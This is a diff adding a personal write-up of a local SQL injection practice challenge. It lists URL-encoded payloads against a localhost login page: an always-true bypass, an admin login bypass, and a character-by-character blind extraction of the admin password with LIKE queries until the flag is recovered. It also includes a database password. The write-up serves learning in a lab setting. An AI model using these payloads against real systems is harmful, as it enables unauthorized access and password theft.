@@ -22,3 +22,48 @@ Success or Failure
 Can you ask the right questions????
 -----------------------------------------------------------------------------------
 
+Changed the line in php file, $db = new mysqli('127.0.0.1', 'teni', 'teni', 'sqli_challenge');
+ to this line , $db = new mysqli('127.0.0.1', 'teni', 'Teni@1234', 'sqli_challenge');
+
+use the link , http://127.0.0.1:8000/sample.php?pw=%27||1=1%23 , to login as guest
+
+use link , http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%23 , to login as admin
+
+Checking first letter of password is "A" , if shows hello guest , admin pass not start with a
+http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20LIKE%20%27a%25%27%23
+
+checking for "b", 
+http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20LIKE%20%27b%25%27%23
+
+similarliy try for c, http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26pw%20LIKE%20%27c%25%27%23
+this is how sql injection works.... tyring for oyherr letrters until correct one is obtained...
+   not working upto d , trying letters ,
+
+http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%270%25%27%23
+
+trying 1 to 9 one by one, http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%271%25%27%23
+
+tryinng upper case , http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%27A%25%27%23
+
+Got first letter as S, http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%27S%25%27%23
+
+finding the second letter...
+ Got U as the second letter...http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%27SU%25%27%23
+
+finding third letter..  
+
+GOT SUP  as third letter , http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%27SUP%25%27%23
+
+got SUPE as 4th .......
+GOT SUPER   ...
+got SUPERS ...
+SUPERSE
+SUPERSEC
+GUESS , supersecret , http://127.0.0.1:8000/sample.php?pw=%27||id%3D%27admin%27%26%26pw%20LIKE%20%27supersecret%25%27%23
+
+confirming pass , http://127.0.0.1:8000/sample.php?pw=supersecret ,
+shows CHALLENGE CLEARED!! Hello admin !!
+
+
+flag{supersecret}
+
